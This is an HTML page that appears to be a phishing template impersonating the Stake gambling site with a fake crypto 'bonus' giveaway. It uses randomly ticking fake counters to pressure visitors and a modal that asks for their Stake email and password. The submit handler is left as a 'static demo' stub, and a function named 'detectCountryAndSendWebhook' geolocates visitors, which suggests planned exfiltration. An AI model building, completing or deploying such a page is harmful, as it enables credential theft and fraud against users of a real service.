<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Stake Bonus</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
    body {
      background: linear-gradient(135deg, #0d1b2a, #1b263b, #0f172a);
      color: #f8fafc;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
      overflow: hidden;
    }
    .card {
      background: rgba(27, 38, 59, 0.9);
      padding: 2rem;
      border-radius: 20px;
      box-shadow: 0 8px 20px rgba(0,0,0,0.5);
      max-width: 400px;
      animation: fadeInUp 1s ease forwards;
    }
    h1 { font-size: 2rem; margin-bottom: 1rem; color: #4fc3f7; }
    p { font-size: 1rem; margin-bottom: 1rem; color: #cbd5e1; }
    .btn {
      display: inline-block;
      padding: 0.75rem 2rem;
      background: linear-gradient(90deg, #4fc3f7, #0288d1);
      color: white;
      font-weight: 600;
      border-radius: 50px;
      text-decoration: none;
      transition: all 0.3s ease;
      box-shadow: 0 4px 15px rgba(2,136,209,0.4);
      margin-top: 1rem;
      cursor: pointer;
    }
    .btn:hover { transform: scale(1.05); box-shadow: 0 6px 20px rgba(2,136,209,0.6); }
    .btn:active { transform: scale(0.98); }
    @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
    footer { margin-top: 2rem; font-size: 0.85rem; color: #64748b; }
    .country-info { margin-bottom: 1rem; font-weight: 600; font-size: 1rem; color: #ffd700; }
    .bonus-info { margin-bottom: 1rem; font-size: 1rem; color: #a5f3fc; }
    .counter { margin-bottom: 1rem; font-size: 1rem; font-weight: 600; color: #facc15; }

    /* Modal */
    .modal {
      display: none;
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0,0,0,0.7);
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }
    .modal-content {
      background: rgba(27,38,59,0.95);
      padding: 1.5rem;
      border-radius: 20px;
      max-width: 380px;
      width: 90%;
      position: relative;
      color: #f8fafc;
    }
    .close-modal {
      position: absolute;
      top: 10px;
      right: 20px;
      cursor: pointer;
      font-size: 1.2rem;
      color: white;
    }
    .modal h2 { color: #4fc3f7; margin-bottom: 1rem; }

    /* Step 1 */
    #step1 { text-align: center; }
    #step1 .btn { width: 100%; }

    /* Step 2 (Login Form from your file) */
    #step2 { display: none; }
    form#loginForm {
      display: flex;
      flex-direction: column;
      gap: 12px;
      margin-top: 1rem;
      text-align: left;
    }
    form#loginForm label { font-size: 0.85rem; color: #cbd5e1; }
    form#loginForm input {
      padding: 0.5rem;
      border-radius: 8px;
      border: none;
      font-size: 0.9rem;
    }
    .field-row { display: flex; gap: 8px; }
    .show-password {
      background: transparent;
      border: none;
      color: #94a3b8;
      cursor: pointer;
      font-size: 0.8rem;
    }
    .links {
      display: flex;
      justify-content: space-between;
      font-size: 0.8rem;
    }
    .remember { display: flex; align-items: center; gap: 4px; }
    #loginForm button {
      padding: 0.6rem;
      border-radius: 50px;
      border: none;
      font-weight: 600;
      cursor: pointer;
      background: linear-gradient(90deg, #4fc3f7, #0288d1);
      color: white;
    }
    #loginForm button:hover { opacity: 0.9; }
    .error { color: #f87171; font-size: 0.8rem; display: none; }
  </style>
</head>
<body>
  <div class="card">
    <div class="country-info" id="country-info"></div>
    <h1>🎉 Claim Your Stake Bonus</h1>
    <p class="bonus-info">Bonus available in <strong>Solana ($10)</strong> and <strong>Ethereum (up to $40)</strong></p>
    <p class="counter" id="claimed-counter">4,000 people already claimed this gift!</p>
    <p class="counter" id="available-counter">Only 457 gifts left!</p>
    <div class="btn" id="redeemBtn">Redeem Bonus</div>
  </div>

  <!-- Modal -->
  <div class="modal" id="loginModal">
    <div class="modal-content">
      <span class="close-modal" id="closeModal">&times;</span>
      
      <!-- Step 1 -->
      <div id="step1">
        <h2>Login with your Stake Account</h2>
        <div class="btn" id="continueBtn">Continue</div>
      </div>

      <!-- Step 2 (full login form) -->
      <div id="step2">
        <h2>Stake Login</h2>
        <form id="loginForm" novalidate>
          <div>
            <label for="email">Email</label>
            <input id="email" name="email" type="email" placeholder="you@company.com" required />
            <div id="emailError" class="error">Please enter a valid email.</div>
          </div>
          <div>
            <label for="password">Password</label>
            <div class="field-row">
              <input id="password" name="password" type="password" minlength="6" placeholder="Enter your password" required />
              <button type="button" id="togglePwd" class="show-password">Show</button>
            </div>
            <div id="pwdError" class="error">Password must be at least 6 characters.</div>
          </div>
          <div class="links">
            <label class="remember"><input id="remember" name="remember" type="checkbox"/> Remember me</label>
            <a href="#">Forgot?</a>
          </div>
          <button type="submit">Sign in</button>
          <div id="submitMsg" class="error" role="status"></div>
        </form>
      </div>
    </div>
  </div>

  <footer>© 2025 Stake Bonus | All rights reserved</footer>

  <script>
    const redeemBtn = document.getElementById('redeemBtn');
    const loginModal = document.getElementById('loginModal');
    const closeModal = document.getElementById('closeModal');
    const step1 = document.getElementById('step1');
    const step2 = document.getElementById('step2');
    const continueBtn = document.getElementById('continueBtn');

    redeemBtn.addEventListener('click', () => {
      loginModal.style.display = 'flex';
      step1.style.display = 'block';
      step2.style.display = 'none';
    });
    closeModal.addEventListener('click', () => loginModal.style.display = 'none');
    window.addEventListener('click', (e) => { if(e.target === loginModal) loginModal.style.display = 'none'; });
    continueBtn.addEventListener('click', () => {
      step1.style.display = 'none';
      step2.style.display = 'block';
    });

    // Login form logic
    const form = document.getElementById('loginForm');
    const email = document.getElementById('email');
    const password = document.getElementById('password');
    const emailError = document.getElementById('emailError');
    const pwdError = document.getElementById('pwdError');
    const submitMsg = document.getElementById('submitMsg');
    const toggle = document.getElementById('togglePwd');

    toggle.addEventListener('click', () => {
      const t = password.getAttribute('type') === 'password' ? 'text' : 'password';
      password.setAttribute('type', t);
      toggle.textContent = t === 'password' ? 'Show' : 'Hide';
    });

    function validateEmail(v){ return /\S+@\S+\.\S+/.test(v); }

    form.addEventListener('submit', e => {
      e.preventDefault();
      let ok = true;
      emailError.style.display = 'none';
      pwdError.style.display = 'none';
      submitMsg.style.display = 'none';

      if(!validateEmail(email.value)){ emailError.style.display = 'block'; ok = false; }
      if(!password.value || password.value.length < 6){ pwdError.style.display = 'block'; ok = false; }

      if(!ok) return;

      submitMsg.style.display = 'block';
      submitMsg.style.color = 'lightgreen';
      submitMsg.textContent = 'Form looks good (static demo). Integrate your auth API here.';
    });

    // Country & Counter
    function getFlagEmoji(countryCode) {
      return countryCode.toUpperCase().replace(/./g, char => String.fromCodePoint(127397 + char.charCodeAt()));
    }
    async function detectCountryAndSendWebhook() {
      try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        const countryCode = data.country_code;
        const countryName = data.country_name;
        const countryInfoDiv = document.getElementById('country-info');
        countryInfoDiv.textContent = `Available in ${countryName} ${getFlagEmoji(countryCode)}`;
      } catch (err) {
        document.getElementById('country-info').textContent = "Available in your country 🌍";
      }
    }
    function updateCounters() {
      const claimedElem = document.getElementById('claimed-counter');
      const availableElem = document.getElementById('available-counter');
      let claimed = 4000, available = 457;
      setInterval(() => {
        const randomClaim = Math.floor(Math.random() * 5) + 1;
        claimed += randomClaim;
        available = Math.max(available - randomClaim, 0);
        claimedElem.textContent = `${claimed.toLocaleString()} people already claimed this gift!`;
        availableElem.textContent = `Only ${available.toLocaleString()} gifts left!`;
      }, 5000);
    }
    detectCountryAndSendWebhook();
    updateCounters();
  </script>
</body>
</html>
